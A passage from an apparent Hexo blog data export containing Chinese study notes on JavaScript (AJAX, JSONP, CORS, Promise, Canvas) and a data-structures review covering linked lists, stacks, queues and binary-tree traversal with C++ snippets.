class="comment">// 可以在此修改form的input...</span></span><br><span class="line">    <span class="comment">// 继续下一步:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure>
<h2 id="操作文件"><a href="#操作文件" class="headerlink" title="操作文件"></a>操作文件</h2><p>在HTML表单中，可以上传文件的唯一控件就是<code>&lt;input type=&quot;file&quot;&gt;</code>。</p>
<p><em>注意</em>：当一个表单包含<code>&lt;input type=&quot;file&quot;&gt;</code>时，表单的<code>enctype</code>必须指定为<code>multipart/form-data</code>，<code>method</code>必须指定为<code>post</code>，浏览器才能正确编码并以<code>multipart/form-data</code>格式发送表单的数据。</p>
<p>出于安全考虑，浏览器只允许用户点击<code>&lt;input type=&quot;file&quot;&gt;</code>来选择本地文件，用JavaScript对<code>&lt;input type=&quot;file&quot;&gt;</code>的<code>value</code>赋值是没有任何效果的。当用户选择了上传某个文件后，JavaScript也无法获得该文件的真实路径。</p>
<h2 id="AJAX"><a href="#AJAX" class="headerlink" title="*AJAX"></a>*AJAX</h2><p>如果要让用户留在当前页面中，同时发出新的HTTP请求，就必须用JavaScript发送这个新请求，接收到数据后，再用JavaScript更新页面，这样一来，用户就感觉自己仍然停留在当前页面，但是数据却可以不断地更新。</p>
<p>用JavaScript写一个完整的AJAX代码并不复杂，但是需要注意：<strong>AJAX请求是异步执行的，也就是说，要通过回调函数获得响应</strong>。</p>
<p>当创建了<code>XMLHttpRequest</code>对象后，要先设置<code>onreadystatechange</code>的回调函数。在回调函数中，通常我们只需通过<code>readyState === 4</code>判断请求是否完成，如果已完成，再根据<code>status === 200</code>判断是否是一个成功的响应。</p>
<p><code>XMLHttpRequest</code>对象的<code>open()</code>方法有3个参数，第一个参数指定是<code>GET</code>还是<code>POST</code>，第二个参数指定URL地址，第三个参数指定是否使用异步，默认是<code>true</code>，所以不用写。</p>
<p><em>注意</em>，千万不要把第三个参数指定为<code>false</code>，否则浏览器将停止响应，直到AJAX请求完成。如果这个请求耗时10秒，那么10秒内你会发现浏览器处于“假死”状态。</p>
<p>最后调用<code>send()</code>方法才真正发送请求。<code>GET</code>请求不需要参数，<code>POST</code>请求需要把body部分以字符串或者<code>FormData</code>对象传进去。</p>
<p><strong>安全限制</strong></p>
<p>上面代码的URL使用的是相对路径。如果你把它改为<code>&#39;http://www.sina.com.cn/&#39;</code>，再运行，肯定报错。在Chrome的控制台里，还可以看到错误信息。默认情况下，<strong>JavaScript在发送AJAX请求时，URL的域名必须和当前页面完全一致。完全一致的意思是，域名要相同（<code>www.example.com</code>和<code>example.com</code>不同），协议要相同（<code>http</code>和<code>https</code>不同），端口号要相同（默认是<code>:80</code>端口，它和<code>:8080</code>就不同）。</strong>有的浏览器口子松一点，允许端口不同，大多数浏览器都会严格遵守这个限制。</p>
<p>JS请求外域的URL：</p>
<p>一是通过Flash插件发送HTTP请求，这种方式可以绕过浏览器的安全限制，但必须安装Flash，并且跟Flash交互。不过Flash用起来麻烦，而且现在用得也越来越少了。</p>
<p>二是通过在同源域名下架设一个代理服务器来转发，JavaScript负责把请求发送到代理服务器：代理服务器再把结果返回，这样就遵守了浏览器的同源策略。这种方式麻烦之处在于需要服务器端额外做开发。</p>
<p>第三种方式称为JSONP，它有个限制，只能用GET请求，并且要求返回JavaScript。这种方式跨域实际上是利用了浏览器允许跨域引用JavaScript资源：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;script src&#x3D;&quot;http:&#x2F;&#x2F;example.com&#x2F;abc.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class="line">    ...</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">...</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>
<p>JSONP通常以函数调用的形式返回，例如，返回JavaScript内容如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">foo(&#39;data&#39;);</span><br></pre></td></tr></table></figure>
<p>这样一来，我们如果在页面中先准备好<code>foo()</code>函数，然后给页面动态加一个<code>&lt;script&gt;</code>节点，相当于动态读取外域的JavaScript资源，最后就等着接收回调了。</p>
<p>以163的股票查询URL为例，对于URL：<a href="http://api.money.126.net/data/feed/0000001,1399001?callback=refreshPrice，你将得到如下返回：" target="_blank" rel="noopener">http://api.money.126.net/data/feed/0000001,1399001?callback=refreshPrice，你将得到如下返回：</a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">refreshPrice(&#123;&quot;0000001&quot;:&#123;&quot;code&quot;: &quot;0000001&quot;, ... &#125;);</span><br></pre></td></tr></table></figure>
<p>因此我们需要首先在页面中准备好回调函数：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function refreshPrice(data) &#123;</span><br><span class="line">    var p &#x3D; document.getElementById(&#39;test-jsonp&#39;);</span><br><span class="line">    p.innerHTML &#x3D; &#39;当前价格：&#39; +</span><br><span class="line">        data[&#39;0000001&#39;].name +&#39;: &#39; + </span><br><span class="line">        data[&#39;0000001&#39;].price + &#39;；&#39; +</span><br><span class="line">        data[&#39;1399001&#39;].name + &#39;: &#39; +</span><br><span class="line">        data[&#39;1399001&#39;].price;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>当前价格：上证指数: 3310.01；深证成指: 13637.883</p>
<p>刷新</p>
<p>最后用<code>getPrice()</code>函数触发：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function getPrice() &#123;</span><br><span class="line">    var</span><br><span class="line">        js &#x3D; document.createElement(&#39;script&#39;),</span><br><span class="line">        head &#x3D; document.getElementsByTagName(&#39;head&#39;)[0];</span><br><span class="line">    js.src &#x3D; &#39;http:&#x2F;&#x2F;api.money.126.net&#x2F;data&#x2F;feed&#x2F;0000001,1399001?callback&#x3D;refreshPrice&#39;;</span><br><span class="line">    head.appendChild(js);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>就完成了跨域加载数据。</p>
<p><strong>CORS</strong></p>
<p>CORS全称Cross-Origin Resource Sharing</p>
<p>本域：Origin，也就是浏览器当前页面的域。</p>
<p>外域：指向的访问网页</p>
<p>当JavaScript向外域发起请求后，浏览器收到响应后，首先检查<code>Access-Control-Allow-Origin</code>是否包含本域，如果是，则此次跨域请求成功，如果不是，则请求失败，JavaScript将无法获取到响应的任何数据。</p>
<p><img src="/2020/07/09/javascript%E5%AD%A6%E4%B9%A0/image-20200801154253687.png" alt="image-20200801154253687"></p>
<h2 id="Promise"><a href="#Promise" class="headerlink" title="Promise"></a>Promise</h2><p>Promise对象先统一执行AJAX逻辑，不关心如何处理结果，然后，根据结果是成功还是失败，在将来的某个时候调用<code>success</code>函数或<code>fail</code>函数。</p>
<p><img src="/2020/07/09/javascript%E5%AD%A6%E4%B9%A0/image-20200801155554430.png" alt="image-20200801155554430"></p>
<p><strong>对Promise和AJAX理解还不是很深刻，回头继续看。</strong></p>
<h2 id="Canvas"><a href="#Canvas" class="headerlink" title="Canvas"></a>Canvas</h2><p>Canvas是HTML5新增的组件，它就像一块幕布，可以用JavaScript在上面绘制各种图表、动画等。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!-- HTML代码 --&gt;</span><br><span class="line">&lt;canvas id&#x3D;&quot;test-canvas&quot; width&#x3D;&quot;200&quot; heigth&#x3D;&quot;100&quot;&gt;</span><br><span class="line">    &lt;p&gt;你的浏览器不支持Canvas&lt;&#x2F;p&gt;</span><br><span class="line">&lt;&#x2F;canvas&gt;</span><br></pre></td></tr></table></figure>
<hr>
<p><strong>后面的jQuery，Node.js和React之后再看。</strong></p>
]]></content>
      <categories>
        <category>前端</category>
      </categories>
      <tags>
        <tag>前端</tag>
        <tag>学习</tag>
      </tags>
  </entry>
  <entry>
    <title>数据结构复习</title>
    <url>/2020/06/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/</url>
    <content><![CDATA[<a id="more"></a>
<h1 id="数据结构复习"><a href="#数据结构复习" class="headerlink" title="数据结构复习"></a>数据结构复习</h1><p>根据老师重点，复习数据结构。</p>
<h1 id="线性表"><a href="#线性表" class="headerlink" title="线性表"></a>线性表</h1><h2 id="循环链表"><a href="#循环链表" class="headerlink" title="循环链表"></a>循环链表</h2><p><strong>循环链表的产生：在单链表中，（1）只知道一个结点，想知道所有结点是不太行的。（2）如果要找一个结点的直接前驱结点，需要从表端一个一个结点查找，时间开销到达了O（n）。</strong></p>
<h3 id="循环链表的概念"><a href="#循环链表的概念" class="headerlink" title="循环链表的概念"></a>循环链表的概念</h3><p>将单链表的首尾相连，使终端结点的指针域指向头结点，构成<strong>单向循环链表。</strong></p>
<p><img src="/2020/06/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/image-20200630163907428.png" alt="image-20200630163907428"></p>
<p>循环链表中可以带头指针和尾指针。</p>
<p>头指针：</p>
<p><img src="/2020/06/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/image-20200630164302095.png" alt="image-20200630164302095"></p>
<p>尾指针：</p>
<p><img src="/2020/06/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/image-20200630164326659.png" alt="image-20200630164326659"></p>
<h3 id="循环链表的插入"><a href="#循环链表的插入" class="headerlink" title="循环链表的插入"></a>循环链表的插入</h3><p><img src="/2020/06/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/image-20200630164711122.png" alt="image-20200630164711122"></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//具体操作</span></span><br><span class="line">s-&gt;link = p-&gt;link;</span><br><span class="line">p-&gt;link = s;</span><br></pre></td></tr></table></figure>
<h2 id="双向链表"><a href="#双向链表" class="headerlink" title="双向链表"></a>双向链表</h2><p><strong>双向链表的产生：解决单链表中的（2）</strong></p>
<h3 id="双向链表的概念"><a href="#双向链表的概念" class="headerlink" title="双向链表的概念"></a>双向链表的概念</h3><p>双向链表中的每个结点都有<strong>一个前驱指针和一个后继指针和数据域</strong>。</p>
<p><img src="/2020/06/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/image-20200630170548596.png" alt="image-20200630170548596"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">p &#x3D; p-&gt;rlink-&gt;llink &#x3D; p-&gt;llink-&gt;rlink;</span><br></pre></td></tr></table></figure>
<h3 id="双向链表的插入"><a href="#双向链表的插入" class="headerlink" title="双向链表的插入"></a>双向链表的插入</h3><p>双向链表的插入分为<strong>前驱方向的插入和后继方向的插入‘</strong>。</p>
<p><strong>后继:</strong></p>
<p><img src="/2020/06/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/image-20200630171322422.png" alt="image-20200630171322422"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;具体操作</span><br><span class="line">newnode-&gt;rlink &#x3D; current-&gt;rlink;</span><br><span class="line">current-&gt;rlink &#x3D; newnode;</span><br><span class="line">newnode-&gt;rlink-&gt;llink &#x3D; newnode;</span><br><span class="line">newnode-&gt;llink &#x3D; current;</span><br></pre></td></tr></table></figure>
<p><strong>前驱（相当于反向的后继）：</strong></p>
<p><img src="/2020/06/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/image-20200630171637079.png" alt="image-20200630171637079"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;具体操作</span><br><span class="line">newnode-&gt;llink &#x3D; current-&gt;llink;</span><br><span class="line">current-&gt;llink &#x3D; newnode;</span><br><span class="line">newnode-&gt;llink-&gt;rlink &#x3D; newnode;</span><br><span class="line">newnode-&gt;rlink &#x3D; current;</span><br></pre></td></tr></table></figure>
<h3 id="双向链表的删除"><a href="#双向链表的删除" class="headerlink" title="双向链表的删除"></a>双向链表的删除</h3><p><img src="/2020/06/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/image-20200630173056989.png" alt="image-20200630173056989"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;具体操作</span><br><span class="line">current-&gt;rlink-&gt;llink &#x3D; current-&gt;llink;</span><br><span class="line">current-&gt;llink-&gt;rlink &#x3D; current-&gt;rlink;</span><br></pre></td></tr></table></figure>
<h1 id="栈"><a href="#栈" class="headerlink" title="栈"></a>栈</h1><p><strong>栈的定义</strong></p>
<p>只允许在一端插入和删除的线性表。<strong>（后进先出）</strong></p>
<p><strong>栈顶：允许插入和删除的一端。</strong></p>
<p><strong>栈底：不允许插入和删除的一端。</strong></p>
<p><img src="/2020/06/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/image-20200630215456726.png" alt="image-20200630215456726"></p>
<h2 id="顺序栈"><a href="#顺序栈" class="headerlink" title="顺序栈"></a>顺序栈</h2><p><img src="/2020/06/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/image-20200630220043153.png" alt="image-20200630220043153"></p>
<p>栈顶指针top=maxsize-1，则表示栈满。</p>
<h3 id="列车调度问题"><a href="#列车调度问题" class="headerlink" title="列车调度问题"></a><strong>列车调度问题</strong></h3><p><img src="/2020/06/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/image-20200630221711583.png" alt="image-20200630221711583"></p>
<p>如上图所述，有多少种不同的出栈序列？</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">F(n)&#x3D;F(0)*F(n-1)+F(1)*F(n-2)+...+F(n-1)*F(n-n)</span><br><span class="line">F(0)&#x3D;1</span><br><span class="line">F(1)&#x3D;F(0)*F(0)&#x3D;1</span><br><span class="line">F(2)&#x3D;F(0)*F(2-1)+F(0)*F(2-2)&#x3D;2</span><br><span class="line">F(3)&#x3D;F(0)*F(3-1)+F(1)*F(3-2)+F(2)*F(3-3)&#x3D;5</span><br><span class="line">F(4)&#x3D;F(0)*F(4-1)+F(1)*F(4-2)+F(2)*F(4-3)+F(3)*F(4-4)&#x3D;14</span><br></pre></td></tr></table></figure>
<p><img src="/2020/06/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/image-20200630223541131.png" alt="image-20200630223541131"></p>
<p><strong>在1423序列中，我们观察子序列423，发现2夹在4和3之间，即最大的数先出栈，最小的数中间出栈，中间的数最后出栈——这无论如何不可能出现，因为它违反栈“后进先出”的特点；同样2413序列中1夹在4和3之间，3412序列中1夹在4和2之间，4312序列中1夹在3和2之间，这都违反LOFI规律。</strong></p>
<h2 id="链式栈"><a href="#链式栈" class="headerlink" title="链式栈"></a>链式栈</h2><p>用单链表来表示栈，为链式栈。</p>
<ul>
<li>链式栈无栈满问题。</li>
<li><strong>链式栈的栈顶在链头</strong>。</li>
<li>插入和删除在栈顶执行。</li>
</ul>
<p><img src="/2020/06/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/image-20200630224640113.png" alt="image-20200630224640113"></p>
<p><strong>*括号匹配</strong></p>
<p><strong>*中缀表达式转换成后缀表达式</strong></p>
<ol>
<li>除左括号和右括号外，同一操作符栈内优先级大于栈外优先级。</li>
<li>若栈外操作符优先级大于栈内操作符，则栈外操作符进栈；否则，出栈。</li>
<li><img src="/2020/06/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/image-20200630231145799.png" alt="image-20200630231145799"></li>
</ol>
<h2 id="栈与递归"><a href="#栈与递归" class="headerlink" title="栈与递归"></a>栈与递归</h2><ol>
<li>定义是递归的（斐波那契数列）</li>
<li>数据结构是递归的（树，链表）</li>
<li>问题解法是递归的</li>
</ol>
<h3 id="汉诺塔问题"><a href="#汉诺塔问题" class="headerlink" title="汉诺塔问题"></a>汉诺塔问题</h3><ol>
<li>用 C 柱做过渡，将 A 柱上的 (n-1) 个盘子移到 B 柱上；</li>
<li>将 A 柱上最后一个盘子直接移到 C 柱上；</li>
<li>用 A 柱做过渡，将 B 柱上的 (n-1) 个盘子移到 C 柱上。</li>
</ol>
<p><img src="/2020/06/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/image-20200701140602693.png" alt="image-20200701140602693"></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Hanoi</span><span class="params">(<span class="keyword">int</span> n,<span class="keyword">char</span> a,<span class="keyword">char</span> b,<span class="keyword">char</span> c)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(n==<span class="number">1</span>)&#123;</span><br><span class="line">    <span class="built_in">move</span>(n,A,C);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span>&#123;</span><br><span class="line">    Hanoi(n<span class="number">-1</span>,A,C,B);</span><br><span class="line">    <span class="built_in">move</span>(n,A,C);</span><br><span class="line">    Hanoi(n<span class="number">-1</span>,B,A,C);</span><br><span class="line">  &#125; </span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">move</span><span class="params">(<span class="keyword">int</span> n,<span class="keyword">char</span> A,<span class="keyword">char</span> C)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">cout</span> &lt;&lt; <span class="string">"Move "</span>&lt;&lt; n &lt;&lt;<span class="string">"From "</span>&lt;&lt; A &lt;&lt;<span class="string">"To "</span>&lt;&lt; C;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="队列"><a href="#队列" class="headerlink" title="队列"></a>队列</h1><p><strong>队列的定义</strong>：</p>
<p>只允许在一端删除，在另一端插入的线性表。（<strong>先进先出</strong>）</p>
<p><strong>队头</strong>：允许删除的=一端。</p>
<p><strong>队尾</strong>：允许插入的一端。</p>
<p><img src="/2020/06/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/image-20200701141927370.png" alt="image-20200701141927370"></p>
<h2 id="循环队列"><a href="#循环队列" class="headerlink" title="循环队列"></a>循环队列</h2><p><img src="/2020/06/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/image-20200701142027568.png" alt="image-20200701142027568"></p>
<ol>
<li>队列初始化：=front = rear = 0;</li>
<li>队头指针进1:  front = (front+1) % maxSize;</li>
<li>队尾指针进1:  rear = (rear+1) % maxSize;</li>
<li>队空条件：front == rear;</li>
<li>队满条件：<strong>(rear+1) % maxSize == front</strong> ;</li>
<li>循环队列只能存放<strong>（maxSize-1）</strong>个元素；</li>
<li>循环队列中元素的个数为：<strong>(rear-front+maxSize)%maxSize;</strong></li>
</ol>
<h2 id="链式队列"><a href="#链式队列" class="headerlink" title="链式队列"></a>链式队列</h2><p><img src="/2020/06/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/image-20200701143456590.png" alt="image-20200701143456590"></p>
<ol>
<li>队头在链头，队尾在链尾。</li>
<li>队空为 front == NULL</li>
</ol>
<h1 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h1><p><strong>数组的存储表示：</strong></p>
<p>设第一个数组元素的存储地址为a，每一个数组元素的存储大小为l</p>
<p>在一维数组中：$LOC(i)=a+i*l$</p>
<p>在二维数组中,按照行优先存储，每一行最多存储元素为m个：$LOC(j,k)=a+(j*m+k)l$</p>
<h1 id="散列表"><a href="#散列表" class="headerlink" title="散列表"></a>散列表</h1><h1 id="树"><a href="#树" class="headerlink" title="树"></a>树</h1><h2 id="树的基本概念"><a href="#树的基本概念" class="headerlink" title="树的基本概念"></a>树的基本概念</h2><p><strong>结点的层次</strong>：根节点在第一层，其他类推。</p>
<p><strong>深度</strong>：树中距离根结点最远的结点所在的层次叫做树的深度。</p>
<p><strong>高度</strong>：高度与深度数值相等，但方向不同。根节点的高度就叫做树的高度。</p>
<p><strong>结点的度</strong>：结点所拥有的子树棵树。</p>
<p><strong>树的度</strong>：树中结点的度的最大值。</p>
<h2 id="二叉树"><a href="#二叉树" class="headerlink" title="二叉树"></a>二叉树</h2><h3 id="二叉树的定义"><a href="#二叉树的定义" class="headerlink" title="二叉树的定义"></a><strong>二叉树的定义</strong></h3><ol>
<li>每个结点最多有两棵子树</li>
<li>左子树和右子树不可颠倒</li>
</ol>
<p>二叉树的五种形态：</p>
<p><img src="/2020/06/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/image-20200701171507765.png" alt="image-20200701171507765"></p>
<h3 id="二叉树的性质"><a href="#二叉树的性质" class="headerlink" title="二叉树的性质"></a>二叉树的性质</h3><ol>
<li><strong>二叉树的第i层最多有$2^{i-1}$个结点</strong></li>
<li><strong>深度为k的二叉树最少有k个结点，最多有$2^k-1$个结点</strong></li>
<li>对任何一棵二叉树，如果其叶结点有 n0 个, 度为 2 的非叶结点有 n2 个,   则有<strong>n0＝n2＋1</strong></li>
<li>具有 n (n≥0) 个结点的完全二叉树的深度为 <strong>$\lceil log2(n+1)\rceil$</strong></li>
<li>如将一棵有n个结点的完全二叉树自顶向下，同一层自左向右连续给结点编号1, 2, …, n，则有以下关系：<br>若i = 1, 则 i 无双亲<br><strong>若i &gt; 1, 则 i 的双亲为$\lfloor i／2\rfloor$</strong><br><strong>i 的左子女为 2 <em>i(如果i有左子女的话)，                             i 的右子女为2 </em>i+1 (如果i有右子女的话)</strong><br>若 i 为奇数, 且i != 1, 则其左兄弟为i-1,<br>若 i 为偶数, 且i != 1, 则其右兄弟为i+1</li>
</ol>
<h3 id="满二叉树"><a href="#满二叉树" class="headerlink" title="满二叉树"></a>满二叉树</h3><p>每一层结点都达到了最大个数的二叉树。深度为k的满二叉树有$2^k-1$个。</p>
<p><img src="/2020/06/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/image-20200701211006705.png" alt="image-20200701211006705"></p>
<h3 id="完全二叉树"><a href="#完全二叉树" class="headerlink" title="完全二叉树"></a>完全二叉树</h3><p>若设二叉树的深度为 k，则共有 k 层。除第 k 层外，其它各层 (1—k-1) 的结点数都达到最大个数，第k层从<strong>右向左连续缺若干结点</strong>，这就是完全二叉树。<strong>（区分非完全二叉树）</strong></p>
<p><img src="/2020/06/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/image-20200701211039265.png" alt="image-20200701211039265"></p>
<h2 id="二叉树的存储表示"><a href="#二叉树的存储表示" class="headerlink" title="二叉树的存储表示"></a>二叉树的存储表示</h2><h3 id="顺序存储"><a href="#顺序存储" class="headerlink" title="顺序存储"></a>顺序存储</h3><p>完全二叉树</p>
<p><img src="/2020/06/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/image-20200701213812241.png" alt="image-20200701213812241"></p>
<p>非完全二叉树</p>
<p><img src="/2020/06/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/image-20200701213920390.png" alt="image-20200701213920390"></p>
<p>问：顺序存储后能否复原成唯一对应的二叉树形状？</p>
<p>答：若是完全/满二叉树则可以做到唯一复原。 因为根据性质5：可知结点i，左孩子的下标值必为2i， 其右孩子的下标值必为2i＋1. 非完全二叉树要将各层空缺处统统补上“虚结点”，其内容为空。</p>
<h3 id="链表存储"><a href="#链表存储" class="headerlink" title="链表存储"></a>链表存储</h3><p>二叉树结点定义：</p>
<p><img src="/2020/06/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/image-20200701214456124.png" alt="image-20200701214456124"></p>
<p><img src="/2020/06/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/image-20200701214613689.png" alt="image-20200701214613689"></p>
<p><strong>含n个结点的二叉链表其中空指针域为n+1个，非空指针域为n-1个</strong>。</p>
<h2 id="二叉树遍历"><a href="#二叉树遍历" class="headerlink" title="二叉树遍历"></a>二叉树遍历</h2><p>==二叉树的遍历就是按某种次序访问树中的结点，要求每个结点访问一次且仅访问一次。==</p>
<h3 id="二叉树遍历的递归算法"><a href="#二叉树遍历的递归算法" class="headerlink" title="二叉树遍历的递归算法"></a>二叉树遍历的递归算法</h3><p>对根的访问时机不同，有三种实现方案：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">VLR（前序）</span><br><span class="line">LVR（中序）</span><br><span class="line">LRV（后序）</span><br></pre></td></tr></table></figure>
<p><strong>前序遍历二叉树</strong></p>
<p><strong>若二叉树为空，则 空操作；否则 (1) 访问根结点； (2) 先序遍历左子树； (3) 先序遍历右子树。</strong></p>
<p><strong>中序遍历二叉树</strong></p>
<p><strong>若二叉树为空， 则空操作；否则 (1) 中序遍历 左子树； (2) 访问根结点； (3) 中序遍历右子树</strong>。</p>
<p><strong>后序遍历二叉树</strong></p>
<p><strong>若二叉树为空，则 空操作；否则 (1) 后序遍历 左子树； (2) 后序遍历 右子树； (3) 访问根结点</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//前序遍历</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">preOrder</span><span class="params">(BiTree T)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(T)&#123;</span><br><span class="line">		<span class="built_in">cout</span> &lt;&lt; T-&gt;data &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">		preOrder(T-&gt;lchild);</span><br><span class="line">		preOrder(T-&gt;rchild);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//中序和后序看访问的次序</span></span><br></pre></td></tr></table></figure>
<p><strong>二叉树算法设计练习</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//二叉树算法设计练习</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//设计算法按前序次序打印二叉树中的叶子结点。</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">PreOrder</span><span class="params">(BiNode *root)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (root == <span class="literal">NULL</span>) <span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (root-&gt;lchild ==<span class="literal">NULL</span> &amp;&amp; root-&gt;rchild==<span class="literal">NULL</span>)</span><br><span class="line">               <span class="built_in">cout</span>&lt;&lt;root-&gt;data;</span><br><span class="line">        PreOrder(root-&gt;lchild);</span><br><span class="line">        PreOrder(root-&gt;rchild);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//设计算法求二叉树中叶子结点个数</span></span><br><span class="line"><span class="function"><span class="keyword">int</span>  <span class="title">CountLeaf</span> <span class="params">(BiNode * T)</span></span>&#123;<span class="comment">// 先序遍历二叉树，以 count 返回二叉树中叶子结点数 </span></span><br><span class="line">  <span class="keyword">if</span> ( T ==null) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">else</span>  <span class="keyword">if</span> ((!T-&gt;Lchild)&amp;&amp; (!T-&gt;Rchild))<span class="keyword">return</span> <span class="number">1</span>;　　　     </span><br><span class="line">  <span class="keyword">else</span>&#123;</span><br><span class="line">      <span class="keyword">int</span> a=CountLeaf( T-&gt;Lchild);</span><br><span class="line">      <span class="keyword">int</span> b = CountLeaf( T-&gt;Rchild); </span><br><span class="line">                <span class="keyword">return</span> a+b;   &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
<h3 id="二叉树遍历的非递归算法"><a href="#二叉树遍历的非递归算法" class="headerlink" title="二叉树遍历的非递归算法"></a>二叉树遍历的非递归算法</h3><p><strong>前序遍历</strong></p>
<p><strong>中序遍历</strong></p>
<p><strong>层次序遍历</strong></p>
<p><img src="/2020/06/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/image-20200702162207234.png" alt="image-20200702162207234"></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="class"><span class="keyword">class</span> <span class="title">T</span>&gt;</span></span><br><span class="line"><span class="class"><span class="title">void</span> <span class="title">BinaryTree</span>&lt;T&gt;:</span>:</span><br><span class="line">levelOrder (<span class="keyword">void</span> (*visit) (BinTreeNode&lt;T&gt; *t)) &#123;</span><br><span class="line">     <span class="keyword">if</span> (root == <span class="literal">NULL</span>) <span class="keyword">return</span>;</span><br><span class="line">     Queue&lt;BinTreeNode&lt;T&gt; * &gt; Q;</span><br><span class="line">     BinTreeNode&lt;T&gt; *p = root;   </span><br><span class="line">      Q.EnQueue (p); 	</span><br><span class="line">     <span class="keyword">while</span> (!Q.IsEmpty ()) &#123;</span><br><span class="line">          Q.DeQueue 